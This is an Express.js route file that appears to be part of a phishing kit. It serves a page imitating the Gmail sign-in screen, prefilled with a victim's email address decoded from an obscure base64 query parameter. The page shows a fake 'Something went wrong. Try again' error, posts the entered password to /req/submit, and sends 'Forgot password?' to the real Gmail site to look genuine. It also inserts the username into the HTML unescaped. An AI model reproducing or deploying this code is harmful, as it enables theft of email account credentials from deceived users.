
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.wihdft948fdjxgjdferuidd;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <link rel="shortcut icon" href="/images/gmail.ico" type="image/x-icon">
    <link rel="stylesheet" href="./stylesheet/newstyle.css">
    <style>
        #pEyar {
            font-size: 18px;
            font-family: Arial, Helvetica, sans-serif;
            color: #2c2a2a;
        }
        
        /* Prevent zoom layout issues */
        .loginform {
            min-width: 600px;
            max-width: 1000px;
        }
        
        .fgtpwd {
    margin-left: 190px !important;
    margin-right: auto !important;
    justify-content: flex-start !important;
    display: flex !important;
}

        
        .btmdiv {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
            width: 900px;
            margin-left: auto;
            margin-right: auto;
            padding: 0 25px;
        }
        
        .left-div {
            margin-left: 0;
            flex: 0;
        }
        
        .right-divs {
            margin-left: 0;
            flex: 0;
        }
    </style>
</head>
<body>
    <div class="maindiv">
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
       
            <div class="form-half">
                <div><img class="divlogo" src="./images/image.png" ></div>
                <br>
                <div><span class="welcome">Welcome<span></div>                
                <div class="userdiv">
                  <img class="left-img"  src="./images/user-circle.png" >&nbsp;&nbsp;
                  <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>&#8201;<span class="chip-arrow">▾</span>&#8201;
                  
                </div>
            </div>
            
            <div class="form-half1">
            <center><p style="color: #da1d1d; position: relative; top: 20px;"> Something went wrong. Try again </p></center>

            <br> <br>
                <div class="passdiv">
                    <input type='hidden' name="username" id="useRname" value="${username}">
                    <input  required='' name="password" type='password' id="pEyar">
                    <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter your password' placeholder='Password'></label>
                </div>

                <div class="shwpwd">
     
                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                    <span onclick="ShowpassWord();" class="button">Show password</span>
                </div>

                <script src="./script/pass.js"></script>

                <div class="fgtpwd">
                    <button id="myButton" class="hyperl" ><b>Forgot password?</b></button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt"><b>Next</b></button>
                    <script>
                      // JavaScript to redirect on button click
                      document.getElementById("myButton").onclick = function () {
                          location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
                      };
                  </script>
                  </div>

            </div>
     
        </form>
        

        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                    <!-- Add more options as needed -->
                </select>
            </div>
                <div class="right-divs">
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Help</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Privacy</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Terms</button>
                    </div>
                </div>
        </div>


    </div>
    
</body>
</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
